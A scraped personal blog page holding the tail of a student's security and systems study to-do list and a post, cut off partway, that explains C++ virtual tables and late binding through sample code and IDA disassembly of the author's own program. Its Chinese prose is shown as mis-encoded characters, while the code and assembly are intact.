<p>ä¸‹é¢è¦è®²çš„åè®®æŒºæœ‰æ„æ€,å¯ä»¥çœ‹çœ‹</p>
<h3 id="è®¡ç»„">è®¡ç»„</h3>
<p>æµæ°´çº¿åŸºæœ¬æ²¡å¬è¯¾,å…‰çŸ¥é“ç®—é‚£å‡ ä¸ªBæ•°ä»€ä¹ˆååç‡å•¥çš„æœ‰ä¸ªğŸ”¨æ„æ€?</p>
<p>ä¸‹é¢IO,ç«¯å£,ä¸­æ–­,ä¸­æ–­å‘é‡,å¯ä»¥çœ‹çœ‹</p>
<h3 id="whats-next">what's next</h3>
<p>å®éªŒå®¤ç»ˆäºæœ‰åœºåœ°äº†,å¯ä»¥æ³¡å®éªŒå®¤äº†</p>
<p>ä¸‹é¢æƒ³çœ‹ä¸€ä¸‹&lt;<æ ¸å¿ƒåŸç†>&gt;45ç« ä»¥å,TLS,PEB,TEB</p>
<h2 id="todolist-on-9.9">ToDoList on 9.9</h2>
<h3 id="ä»¥å¾€çš„é”™è¯¯">ä»¥å¾€çš„é”™è¯¯</h3>
<p>å¤ªéš¾çš„CTFç›´æ¥æ‘†çƒ‚</p>
<p>æ‰“å®ŒCTFæ‡’å¾—å¤ç›˜,å¾ˆå¤šé¢˜åšäº†ä¸€åŠå°±åºŸäº†</p>
<p>ä¸æ•¢çœ‹CVE,æ€»æ˜¯è§‰å¾—çœ‹ä¸æ˜ç™½,æ€»æ˜¯æƒ³çœ‹å®Œæ‰€æœ‰ä¹¦å†å¼€å§‹</p>
<p>åšçš„é¢˜å¤ªå°‘,linuxåŠ¨æ€é“¾æ¥å½“æ—¶ä¼šäº†,ç°åœ¨åˆæ¨¡ç³Šäº†,å†åšret2libcåˆæŠ“ç</p>
<h3 id="win32ç¨‹åºè®¾è®¡">win32ç¨‹åºè®¾è®¡</h3>
<p>å†™å®Œè®°äº‹æœ¬,æ‰«é›·,ç„¶åé€†å‘è‡ªå·±å†™çš„è¿˜æœ‰winxpè‡ªå¸¦çš„</p>
<h3
id="x86æ±‡ç¼–è¯­è¨€ä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼">x86æ±‡ç¼–è¯­è¨€ä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼</h3>
<p>å·²ç»çœ‹å®Œçš„æ˜¯3.4.5.6.10.11.13.14</p>
<p>ä½†æ˜¯ä»ç¬¬5ç« ä¹‹åæ„Ÿè§‰å¾ˆè™šå¾ˆè™š,åªæ˜¯åˆ†æäº†ä¸€ä¸‹æºç å†™äº†æ³¨é‡Š,å®éªŒå‡ ä¹éƒ½æ²¡åš,è¿™å¯¼è‡´åæ¥çœ‹13.14çš„è¯¾åå®éªŒæ—¶å•¥ä¹Ÿå†™ä¸å‡ºæ¥.éœ€è¦è¡¥ä¸Š.</p>
<h3 id="æ•°æ®åº“è®¡ç½‘">æ•°æ®åº“,è®¡ç½‘</h3>
<p>è®¡ç½‘å¸¦å®½,é€Ÿç‡é‚£ä¸€å¨å…¬å¼æ²¡å¤§å¬,å‚…é‡Œå¶å˜æ¢è¿˜æ²¡çœ‹æ‡‚</p>
<p>æ•°æ®åº“ä¸æƒ³å¬è¯¾,è¯¾æœ¬è½ä¸‹100é¡µæ²¡çœ‹äº†</p>
<h3 id="manim">manim</h3>
<p>æ€ä¹ˆç”»æ¤­åœ†?</p>
<p>æ€ä¹ˆç”»åˆ‡çº¿?</p>
<p>éƒ½æœ‰å•¥å‡½æ•°å¯ä»¥ç”¨?</p>
<p>è¶Šæ¥è¶Šæ„Ÿè§‰è¿™é‡Œæ°´å¾ˆæ·±,è¦ç”¨é¡ºæºœå¿…é¡»å¾—çœ‹æºç </p>
<p>è¿™ç©æ„ä¹Ÿä¸ç”¨åšç¬”è®°,ä»£ç çœ‹æ‡‚äº†ç”¨ä¸€æ¬¡å°±è®°ä½äº†</p>
<p>geogebraé‡Œé¢çš„ä¸€äº›åŠŸèƒ½,å¯¹åº”åˆ°manimé‡Œé¢æ€ä¹ˆç”¨?</p>
<p>è¿™ä¸ªå¯ä»¥è®°ä¸€ä¸‹,åªè®°å‡½æ•°æ¥å£.å¯èƒ½çœ‹çœ‹APIå°±ä¼šäº†å§</p>
<p>å…ˆæ”¾æ”¾,å…ˆæ”¾æ”¾</p>
<h3 id="é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†">é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†</h3>
<p>æ¶ˆæ¯é’©å–åœ¨win11ä¸ŠæˆåŠŸäº†,ä½†æ˜¯DLLæ³¨å…¥ç™½æ­</p>
<p>æ¶ˆæ¯é’©å–åçš„è°ƒè¯•ä¹Ÿæ²¡ä¸Šæœºå®éªŒ</p>
<h3 id="ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»">ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»</h3>
<p>éœ€è¦å¤ä¹ ä¸€ä¸‹ç¬¬8ç« linuxå…±äº«åº“,ç„¶åç¬¬11,12,13è¿˜æ²¡çœ‹</p>
<h3 id="csapp">CSAPP</h3>
<p>å¯ä»¥çœ‹ç¬¬å››ç« äº†,æ­£å¥½è®¡ç»„å­¦åˆ°æµæ°´çº¿äº†</p>
<p>ç¬¬9ç« æœ‰ä¸ªmallocçš„å®ç°,ç­‰ç©å…·å†…æ ¸å†™åˆ°ä¸€å®šç¨‹åº¦äº†,éœ€è¦ç”¨ç®—æ³•ç®¡ç†å†…å­˜çš„æ—¶å€™å†è¯´å§</p>
<h3 id="è®¡ç½‘è‡ªé¡¶å‘ä¸‹">è®¡ç½‘è‡ªé¡¶å‘ä¸‹</h3>
<p>ç¬¬å››ç« ç½‘ç»œå±‚æ”¾å‡å‰çœ‹å®Œäº†,ä½†æ˜¯å½“æ—¶æ²¡æœ‰åšç¬”è®°,æ˜¯é€¼ç€è‡ªå·±çœ‹å®Œçš„,å¾ˆè™š,éœ€è¦å†çœ‹ä¸€é</p>
<p>ç¬¬ä¸‰ç« ä¼ è¾“å±‚çš„TCPåè®®è¿˜æ²¡çœ‹</p>
<h3 id="whats-next-1">What's Next?</h3>
<p>æ¶æ¶å¿ƒå¿ƒçš„,å…ˆçœ‹CSAPP ç¬¬å››ç« å§,ç›¸å¯¹æ¥è¯´æ˜¯ä¸ªè½¯æŸ¿å­</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/23/C++%E6%99%9A%E8%81%94%E7%BC%96%E6%9C%BA%E5%88%B6%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/23/C++%E6%99%9A%E8%81%94%E7%BC%96%E6%9C%BA%E5%88%B6%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">C++æ™šè”ç¼–æœºåˆ¶å¦‚ä½•å®ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-23 22:00:00" itemprop="dateCreated datePublished" datetime="2022-09-23T22:00:00+08:00">2022-09-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-03-10 20:41:33" itemprop="dateModified" datetime="2025-03-10T20:41:33+08:00">2025-03-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="cæ™šè”ç¼–å¦‚ä½•å®ç°">C++æ™šè”ç¼–å¦‚ä½•å®ç°</h1>
<h2 id="è™šå‡½æ•°å¯¹-å¯¹è±¡çš„å†…å­˜ç»“æ„çš„å½±å“">è™šå‡½æ•°å¯¹
å¯¹è±¡çš„å†…å­˜ç»“æ„çš„å½±å“</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1) <span class="comment">//å–æ¶ˆæ‰€æœ‰å¯¹é½è¦æ±‚</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    public:</span><br><span class="line">    <span class="type">char</span> only[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>&#123;</span></span><br><span class="line">    public:</span><br><span class="line">    <span class="type">char</span> only[<span class="number">1</span>];</span><br><span class="line">    virtual <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">A a;</span><br><span class="line">B b;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="keyword">sizeof</span>(A)&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;<span class="keyword">sizeof</span>(B)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;&amp;a&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;&amp;a.only&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;&amp;b&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;&amp;b.only&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\testC++\testCpp&gt; g++ main.cpp -O0 -o main -m32</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\testC++\testCpp&gt; ./main</span><br><span class="line"><span class="number">1</span>  <span class="number">5</span></span><br><span class="line"><span class="number">0x4da020</span>  <span class="number">0x4da020</span></span><br><span class="line"><span class="number">0x4da024</span>  <span class="number">0x4da028</span></span><br></pre></td></tr></table></figure>
<p>aå’Œbä¸¤ä¸ªå¯¹è±¡çš„å”¯ä¸€åŒºåˆ«å°±æ˜¯,bæœ‰ä¸€ä¸ªè™šå‡½æ•°,aæ²¡æœ‰</p>
<p>ä½†æ˜¯bå´åˆ5ä¸ªå­—èŠ‚å¤§å°,aåªæœ‰1ä¸ª,</p>
<p>açš„åŸºåœ°å€å°±æ˜¯açš„ç¬¬ä¸€ä¸ªæˆå‘˜onlyçš„åŸºåœ°å€</p>
<p>bçš„åŸºåœ°å€åŠ ä¸Š4åç§»æ‰åˆ°å…¶ç¬¬ä¸€ä¸ªæˆå‘˜onlyçš„åŸºåœ°å€</p>
<p>bæœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ç©¶ç«Ÿè—äº†ä»€ä¹ˆå‘¢?è™šè¡¨æŒ‡é’ˆ</p>
<h2 id="å¤šæ€ä¸æ™šè”ç¼–">å¤šæ€ä¸æ™šè”ç¼–</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in father func1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	virtual <span class="type">int</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a + b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in father func3&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span>public A &#123;</span><br><span class="line">public:</span><br><span class="line">	<span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in son func1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in son func3&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	A* handle = new B;</span><br><span class="line">	handle-&gt;func1();<span class="comment">//åªæœ‰è¿™ç§æŒ‡é’ˆè°ƒç”¨æ–¹å¼æ‰å¯ä»¥å¤šæ€ï¼Œç”¨Â·å·æˆå‘˜ç¬¦å·æ— æ³•è°ƒç”¨</span></span><br><span class="line">	handle-&gt;func2(<span class="number">5</span>, <span class="number">6</span>);<span class="comment">//è™šå‡½æ•°,ä½†æ˜¯æ²¡æœ‰é‡è½½è°ƒç”¨å­ç±»è™šå‡½æ•°</span></span><br><span class="line">	handle-&gt;func3();<span class="comment">//æ™®é€šæˆå‘˜å‡½æ•°,ä½†æ˜¯handleæ˜¯Aç±»å‹æŒ‡é’ˆ,å› æ­¤ä¼šè°ƒç”¨Aç±»çš„func3å‡½æ•°</span></span><br><span class="line">	delete handle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="a-handle-new-b">A* handle = new B;</h3>
<p>mainå‡½æ•°å¼€å§‹è¿™ä¹ˆä¸€å¨,å°±å¹²äº†<code>A* handle = new B;</code>è¿™ä¸€ä¸ªäº‹</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922184558826.png"
alt="image-20220922184558826" />
<figcaption aria-hidden="true">image-20220922184558826</figcaption>
</figure>
<p>ä½†æ˜¯å¾ˆè¿·çš„æ˜¯,åœ¨ä¸»å‡½æ•°æ ˆå¸§ä¸­,å°±å¯¹è±¡çš„æŒ‡é’ˆå°±æœ‰ä¸‰ä¸ª,handle1,handle2,handle,å‰ä¸¤è€…éƒ½æ˜¯ä¸´æ—¶çš„,åœ¨ä¸¤ä¸‰æ¡æŒ‡ä»¤ä¸­å‡ºç°è¿‡ä¹‹åå°±ä¸å†ä½¿ç”¨äº†,æœ€åhandleæ¥ç®¡äº†å¤§æƒ.</p>
<p>å¦‚æœæ‰“å¼€ç¼–è¯‘ä¼˜åŒ–å¯èƒ½æƒ…å†µä¼šå¥½ä¸€ç‚¹</p>
<p>å…¶ä¸­è°ƒç”¨æ„é€ å‡½æ•°<code>??0B@@QAE@XZ</code>çš„æ—¶å€™,é¦–å…ˆè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ å‡½æ•°,åœ¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ä¸­æ³¨å†Œäº†çˆ¶ç±»çš„è™šå‡½æ•°è¡¨,ç„¶ååˆå›åˆ°æœ¬æ„é€ å‡½æ•°ä¸­,æ³¨å†Œå­ç±»çš„è™šå‡½æ•°è¡¨,è¦†ç›–äº†çˆ¶ç±»çš„è™šå‡½æ•°è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00641140 push    ebp</span><br><span class="line">.text:00641141 mov     ebp, esp</span><br><span class="line">.text:00641143 push    ecx</span><br><span class="line">.text:00641144 mov     [ebp+this], ecx</span><br><span class="line">.text:00641147 mov     ecx, [ebp+this] ; this</span><br><span class="line">.text:0064114A call    ??0A@@QAE@XZ    ; A::A(void)</span><br><span class="line">.text:0064114F mov     eax, [ebp+this]</span><br><span class="line">.text:00641152 mov     dword ptr [eax], offset ??_7B@@6B@ ; const B::`vftable&#x27;</span><br><span class="line">.text:00641158 mov     eax, [ebp+this]</span><br><span class="line">.text:0064115B mov     esp, ebp</span><br><span class="line">.text:0064115D pop     ebp</span><br><span class="line">.text:0064115E retn</span><br></pre></td></tr></table></figure>
<h4 id="aa">A::A()</h4>
<p>å­ç±»æ„é€ å‡½æ•°æ— è®ºå¦‚ä½•éƒ½ä¼šé¦–å…ˆéšå¼æ‰§è¡Œçˆ¶ç±»çš„æ„é€ å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00641160 push    ebp</span><br><span class="line">.text:00641161 mov     ebp, esp</span><br><span class="line">.text:00641163 push    ecx</span><br><span class="line">.text:00641164 mov     [ebp+this], ecx</span><br><span class="line">.text:00641167 mov     eax, [ebp+this]</span><br><span class="line">.text:0064116A mov     dword ptr [eax], offset ??_7A@@6B@ ; const A::`vftable&#x27;</span><br><span class="line">.text:00641170 mov     eax, [ebp+this]</span><br><span class="line">.text:00641173 mov     esp, ebp</span><br><span class="line">.text:00641175 pop     ebp</span><br><span class="line">.text:00641176 retn</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå…³é”®çš„ä¸€ç‚¹å°±æ˜¯æ³¨å†Œäº†çˆ¶ç±»çš„è™šå‡½æ•°è¡¨,çˆ¶ç±»æ„é€ å‡½æ•°æ‰§è¡Œå®Œä¹‹å,å¯¹è±¡çš„çŠ¶æ€æ˜¯è¿™æ ·çš„</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192353739.png"
alt="æ³¨å†Œçˆ¶ç±»è™šè¡¨æŒ‡é’ˆ" />
<figcaption aria-hidden="true">æ³¨å†Œçˆ¶ç±»è™šè¡¨æŒ‡é’ˆ</figcaption>
</figure>
<h4 id="å›åˆ°å­ç±»æ„é€ å‡½æ•°">å›åˆ°å­ç±»æ„é€ å‡½æ•°</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0064114F mov     eax, [ebp+this]</span><br><span class="line">.text:00641152 mov     dword ptr [eax], offset ??_7B@@6B@ ; const B::`vftable&#x27;</span><br><span class="line">.text:00641158 mov     eax, [ebp+this]</span><br><span class="line">.text:0064115B mov     esp, ebp</span><br><span class="line">.text:0064115D pop     ebp</span><br><span class="line">.text:0064115E retn</span><br></pre></td></tr></table></figure>
<p>ä»çˆ¶ç±»æ„é€ å‡½æ•°å›æ¥ä¹‹å,åˆå°†B::vftable@rdataæ³¨å†Œåˆ°å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—ä¸Š,è¦†ç›–äº†çˆ¶ç±»æ„é€ å‡½æ•°çš„æ³¨å†Œæ•ˆæœ</p>
<p>å®é™…ä¸Šå¯¹äºè¿™ä¸ªå•¥æˆå‘˜ä¹Ÿæ²¡æœ‰çš„å­ç±»,çˆ¶ç±»æ„é€ å‡½æ•°çœŸçš„æ‰§è¡Œäº†ä¸€ä¸ªå¯‚å¯,å®ƒå„¿å­ä¸å¬è¯ç¯¡æ”¹äº†å®ƒè€å­çš„è™šè¡¨æŒ‡é’ˆ</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192605634.png"
alt="æ³¨å†Œå­ç±»è™šè¡¨æŒ‡é’ˆ,è¦†ç›–çˆ¶ç±»è™šè¡¨æŒ‡é’ˆ" />
<figcaption
aria-hidden="true">æ³¨å†Œå­ç±»è™šè¡¨æŒ‡é’ˆ,è¦†ç›–çˆ¶ç±»è™šè¡¨æŒ‡é’ˆ</figcaption>
</figure>
<p>Aå’ŒBç±»çš„è™šå‡½æ•°è¡¨éƒ½åœ¨rdataåŒº,å¹¶ä¸”è·ç¦»å¾ˆè¿‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.rdata:006431FC ; void (__cdecl *const A::`vftable&#x27;[3])()</span><br><span class="line">.rdata:006431FC ??_7A@@6B@ dd offset ?func1@A@@UAEXXZ   ; DATA XREF: A::A(void)+Aâ†‘o</span><br><span class="line">.rdata:006431FC                                         ; A::func1(void)</span><br><span class="line">.rdata:00643200 dd offset ?func2@A@@UAEHHH@Z            ; A::func2(int,int)</span><br><span class="line">...</span><br><span class="line">.rdata:0064320C ; void (__cdecl *const B::`vftable&#x27;[3])()</span><br><span class="line">.rdata:0064320C ??_7B@@6B@ dd offset ?func1@B@@UAEXXZ   ; DATA XREF: B::B(void)+12â†‘o</span><br><span class="line">.rdata:0064320C                                         ; B::func1(void)</span><br><span class="line">.rdata:00643210 dd offset ?func2@A@@UAEHHH@Z            ; A::func2(int,int)</span><br></pre></td></tr></table></figure>
<p>è™½ç„¶åªæœ‰ä¸¤ä¸ªè™šå‡½æ•°,ä½†æ˜¯è™šå‡½æ•°è¡¨æœ‰ä¸‰é¡¹,å…¶ä¸­å‰ä¸¤é¡¹æ˜¯å‡½æ•°æŒ‡é’ˆ,æœ€åä¸€é¡¹ç”¨NULLè¡¨ç¤ºè™šå‡½æ•°è¡¨ç»“æŸ</p>
<p>è¿˜è¦æ³¨æ„çš„æ˜¯,ä¸¤ä¸ªè™šå‡½æ•°è¡¨ä¸­çš„func1æ˜¯ä¸åŒçš„å‡½æ•°æŒ‡é’ˆ,ä½†æ˜¯func2æ˜¯åŒä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?func1@A@@UAEXXZ</span><br><span class="line">?func1@B@@UAEXXZ</span><br><span class="line">?func2@A@@UAEHHH@Z </span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯å› ä¸ºå­ç±»æ²¡æœ‰é‡è½½äº†func1,ä½†æ˜¯æ²¡æœ‰é‡è½½func2,äºæ˜¯ä¸¤ä¸ªè™šè¡¨çš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆåˆ†åˆ«æŒ‡å‘ä¸¤ä¸ªä¸åŒçš„å‡½æ•°,ä¸¤ä¸ªè™šè¡¨çš„ç¬¬äºŒä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå‡½æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922200159404.png"
alt="image-20220922200159404" />
<figcaption aria-hidden="true">image-20220922200159404</figcaption>
</figure>
<p>è™šè¡¨ä½äºrdataåŒº,å¯æƒ³è€ŒçŸ¥,è¿™é‡Œçš„è™šå‡½æ•°æŒ‡é’ˆå€¼åœ¨ç¼–è¯‘é“¾æ¥æ—¶å°±å·²ç»å†³å®šäº†,æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ä¸­ä¸ä¼šå‘ç”Ÿå˜åŒ–</p>
<p><strong>å› æ­¤å¯ä»¥è¯´å¤šæ€çš„å…³é”®,å°±åœ¨äºæ„é€ å‡½æ•°ä¸€å¼€å§‹æ³¨å†Œå“ªä¸ªç±»çš„è™šå‡½æ•°è¡¨</strong></p>
<h3 id="handle-func1">handle-&gt;func1();</h3>
<p>ä¸‹é¢é©¬ä¸Šå°±è¦è°ƒç”¨ç¬¬ä¸€ä¸ªè™šå‡½æ•°äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:006410E3 mov     ecx, [ebp+handle];å¯¹è±¡åœ°å€æ”¾åˆ°ecxä¸­ä½œä¸ºthisæŒ‡é’ˆ</span><br><span class="line">.text:006410E6 mov     edx, [ecx];å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—æ”¾åˆ°edxä¸­</span><br><span class="line">.text:006410E8 mov     ecx, [ebp+handle];å¯¹è±¡åœ°å€æ”¾åˆ°ecxä¸­ä½œä¸ºthisæŒ‡é’ˆ</span><br><span class="line">.text:006410EB mov     eax, [edx];å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—å†è§£å¼•ç”¨å–å¾—çš„å€¼æ”¾åˆ°eaxä¸­</span><br><span class="line">.text:006410ED call    eax;è°ƒç”¨eaxä¸­çš„åœ°å€</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªè¿‡ç¨‹ç”»åœ¨å›¾ä¸Šç›¸å½“äº</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192743617.png"
alt="è°ƒç”¨ä¸€ä¸ªè™šå‡½æ•°" />
<figcaption aria-hidden="true">è°ƒç”¨ä¸€ä¸ªè™šå‡½æ•°</figcaption>
</figure>
<blockquote>
<p>æ‰€è°“"åŠ¨æ€è”ç¼–"æˆ–è€…"æ™šè”ç¼–"å°±ä½“ç°åœ¨è¿™é‡Œ,è¦è°ƒç”¨çš„è™šå‡½æ•°æ˜¯ä»¥å˜é‡çš„å½¢å¼æ”¾åˆ°eaxä¸­è°ƒç”¨çš„</p>
<p>è€Œä¸€èˆ¬è°ƒç”¨å‡½æ•°éƒ½æ˜¯ç›´æ¥å†™æ­»äº†<code>call å‡½æ•°åœ°å€</code></p>
<p>å¹¶ä¸”åœ¨è°ƒç”¨è™šå‡½æ•°çš„æ—¶å€™,ç¼–è¯‘å™¨è¿˜çœŸä¸çŸ¥é“è¦è°ƒç”¨å“ªä¸ªå‡½æ•°</p>
<p>ç¼–è¯‘å™¨åªæ˜¯åœ¨å¯¹è±¡çš„æ„é€ å‡½æ•°ä¸­æ³¨å†Œè¯¥å¯¹è±¡çš„è™šè¡¨,è¦†ç›–çˆ¶ç±»çš„è™šè¡¨,ç„¶ååæ¥åœ¨è°ƒç”¨è™šå‡½æ•°çš„æ—¶å€™åªéœ€è¦æŸ¥è™šè¡¨,è€Œæ— éœ€å…³å¿ƒè¿™æ˜¯è°çš„è™šè¡¨,å› ä¸ºæ„é€ å‡½æ•°æ—¶å·²ç»æ³¨å†Œå¥½è¿™æ˜¯è°çš„è™šè¡¨äº†</p>
</blockquote>
<h3 id="handle-func25-6">handle-&gt;func2(5, 6);</h3>
